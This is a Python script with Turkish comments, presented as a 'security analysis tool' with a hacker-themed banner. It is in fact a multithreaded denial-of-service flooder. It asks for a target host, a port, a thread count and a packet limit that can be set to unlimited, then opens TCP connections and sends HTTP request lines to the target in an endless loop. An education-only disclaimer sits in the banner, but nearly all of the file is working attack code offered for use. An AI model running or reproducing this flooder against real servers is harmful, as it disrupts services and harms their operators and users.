import socket
import threading
import time
import sys
import random
from colorama import Fore, Style, init

init(autoreset=True)

# Kullanılacak renk paleti
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

def banner():
    c = random.choice(colors)
    # Hacker temalı ASCII Art Logo ve İsim
    # Bu logo 'ANSI' blok karakterleri kullanılarak tasarlanmıştır.
    logo = f"""
    {c}      .---.        {Fore.WHITE}________________________________________________
    {c}     /     \      {Fore.WHITE}|                                                |
    {c}    | () () |     {Fore.WHITE}|  {Fore.GREEN}BERITAN AYDIN - GÜVENLİK ANALİZ ARACI {Fore.WHITE}      |
    {c}     \  ^  /      {Fore.WHITE}|________________________________________________|
    {c}      |||||       
    {c}      |||||       {Fore.CYAN}  ██████╗ ███████╗██████╗ ██╗████████╗ █████╗ ███╗   ██╗
    {c}    _.'---'._     {Fore.CYAN}  ██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔══██╗████╗  ██║
    {c}   /         \    {Fore.CYAN}  ██████╔╝█████╗  ██████╔╝██║   ██║   ███████║██╔██╗ ██║
    {c}  /   {Fore.WHITE}BERITAN{c}   \   {Fore.CYAN}  ██╔══██╗██╔════╝██╔══██╗██║   ██║   ██╔══██║██║╚██╗██║
    {c} /             \  {Fore.CYAN}  ██████╔╝███████╗██║  ██║██║   ██║   ██║  ██║██║ ╚████║
    {c} \_.-'     '-._/  {Fore.CYAN}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
    
    {Fore.YELLOW}    [!] UYARI: Bu araç sadece eğitim ve test amaçlıdır.
    {Fore.RED}    -------------------------------------------------------------------
    """
    print(logo)

sent_packets = 0
lock = threading.Lock()

def attack(ip, port, packet_limit):
    global sent_packets
    while True:
        if packet_limit != 0 and sent_packets >= packet_limit:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (ip, port))
            s.close()
            
            with lock:
                sent_packets += 1
                color = random.choice(colors)
                # Her paket gönderiminde yanıp sönen bir efekt
                print(f"{color}[{random.choice(['⚡', '☢', '⚙'])}] PAKET GÖNDERİLDİ! | ID: {sent_packets} | Hedef: {ip}:{port}")
        except:
            print(f"{Fore.RED}[!] Sunucu Meşgul veya Bağlantı Kapatıldı.")

if __name__ == "__main__":
    banner()
    
    target_input = input(Fore.CYAN + "Hedef IP veya URL: ").replace("https://", "").replace("http://", "").split('/')[0]
    
    try:
        target_ip = socket.gethostbyname(target_input)
        print(f"{Fore.GREEN}[✔] Hedef IP Çözüldü: {target_ip}")
    except:
        print(Fore.RED + "[✘] Geçersiz adres formatı.")
        sys.exit()

    port = int(input(Fore.YELLOW + "Hedef Port (Standart 80/443): "))
    thr = int(input(Fore.MAGENTA + "Thread Sayısı (Hız): "))
    limit = int(input(Fore.BLUE + "Paket Limiti (Sonsuz için 0): "))

    print(f"\n{Fore.WHITE}Saldırı Hazırlanıyor... {Fore.RED}3... 2... 1... GO!\n")
    time.sleep(2)

    for i in range(thr):
        t = threading.Thread(target=attack, args=(target_ip, port, limit))
        t.daemon = True
        t.start()

    try:
        while True:
            if limit != 0 and sent_packets >= limit:
                print(f"\n{Fore.GREEN}[BİTTİ] Belirlenen limit tamamlandı.")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] İşlem Beritan tarafından sonlandırıldı. Toplam: {sent_packets}")
